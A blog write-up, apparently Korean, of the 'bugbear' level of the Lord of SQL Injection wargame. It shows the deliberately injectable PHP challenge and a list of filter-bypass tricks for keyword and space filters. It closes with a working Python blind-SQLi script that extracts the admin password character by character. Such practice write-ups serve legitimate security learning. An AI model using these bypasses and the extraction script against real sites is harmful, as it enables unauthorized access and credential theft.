---
layout: post
title:  "los prob_bugbear"
date:   2019-09-06
excerpt: "Lord of Sql Injection"
tag:
- los
- blind_sqli
- wargame
- webhacking
comments: true
---
> query : select id from prob_bugbear where id='guest' and pw='' and no=

~~~ php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
~~~

# Solve
1. or 필터링 -> /|/|
2. and 필터링 -> &&
3. substr 필터링 -> mid함수로 우회
4. =, like 필터링 -> in함수로 우회
5. 공백 필터링 -> %0a로 우회

~~~ python 
# python 3.7
# bugbear_ex.py

import requests

url="https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
cookies = {"PHPSESSID":"xxxxxxxxx"}

# Find pw length
print("[+] Start find pw length")
length = 0
while True:
    query = '?pw=noonzib&no=9999||id%0ain%0a("admin")%26%26length(pw)%0ain%0a("'+str(length)+'")'
    response = requests.get(url=url+query,cookies=cookies)
    if (response.text.find("Hello admin") != -1):
        print("[-] Find pw's length :",length)
        break
    else:
        length += 1

# Find pw
print("[+] Start find pw")
flag = ""
for i in range(1,length+1):
    for j in range(48,127):
        query = '?pw=noonzib&no=9999||id%0ain%0a("admin")%26%26mid(pw,'+str(i)+',1)%0ain%0a("'+chr(j)+'")'
        response = requests.get(url=url+query,cookies=cookies)
        if(response.text.find("Hello admin") != -1):
            flag += chr(j)
            print("[-] Find key :",flag)
            break
print("[+] Flag is",flag)
# 소문자로 바꿔줘야됨
~~~


## BUGBEAR Clear!
